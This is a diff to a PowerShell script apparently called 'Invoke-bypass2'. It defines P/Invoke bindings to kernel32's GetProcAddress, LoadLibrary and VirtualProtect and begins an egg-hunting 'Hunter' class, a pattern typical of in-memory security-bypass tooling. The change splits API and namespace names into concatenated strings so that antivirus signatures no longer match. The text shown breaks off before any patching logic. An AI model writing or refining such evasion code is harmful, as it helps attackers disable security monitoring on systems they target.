@@ -8,25 +8,22 @@ Invoke-bypass2
  
 #>
 
-$K2 = @"
-
+$K2 = "
 using System;
-using System.Runtime.InteropServices;
-
+using System.Runtime.Interop"+"Services;
 public class K2 {
-
-    [DllImport("kernel32",EntryPoint="Get"+"Proc"+"Address")]
+    [Dll"+"Import(""kernel32"",EntryPoint=""Get""+""Proc""+""Address"")]
     public static extern IntPtr gpa(IntPtr hModule, string procName);
 
-    [DllImport("kernel32",EntryPoint="Load"+"Library")]
+    [Dll"+"Import(""kernel32"",EntryPoint=""Load""+""Library"")]
     public static extern IntPtr ll(string name);
 
-    [DllImport("kernel32",EntryPoint="Virtual"+"Protect")]
+    [Dll"+"Import(""kernel32"",EntryPoint=""Virtual""+""Protect"")]
     public static extern bool vp(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 	public static void Copy(Byte[] source, Int32 startIndex, Int"+"Ptr destination, Int32 length)
 	{ Mar"+"shal.Copy(source, startIndex, destination, length);}
 }
-"@
+"
 
 Class Hunter {
     static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
